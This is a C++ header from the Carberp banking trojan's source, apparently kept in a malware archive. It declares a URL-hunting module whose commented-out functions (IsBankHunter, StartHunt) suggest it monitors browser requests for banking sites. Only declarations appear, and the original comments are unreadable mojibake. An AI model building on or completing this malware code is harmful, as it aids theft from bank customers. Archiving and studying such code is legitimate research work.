/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef HunterH
#define HunterH
//----------------------------------------------------------------------------
#include <windows.h>

//void IsBankHunter( HINTERNET hRequest );
//void StartHunt();
//DWORD WINAPI RunHuntThred( LPVOID lpData );
//void Hunting();


// ������������ ������ ������ ��� �������� ������ (������� ������� �������)
#define HUNTER_PARAM_SIZE  2048
#define HUNTER_PARAM_NAME  "__URL__HUNTER__LINKS\0"
#define HUNTER_PARAM_ENCRYPTED true


namespace URLHunter
{
	// �������������� ������ �������
	void Initialize();

	// ��������� ������ �������� ������� ��������
	// �������� ������ � ������ ��������
    void StartClient();

	// ��������� ���������� ������ � ����� ������� �� ������ ������ ��������
    void CheckURL(PCHAR URL);
}

//----------------------------------------------------------------------------
#endif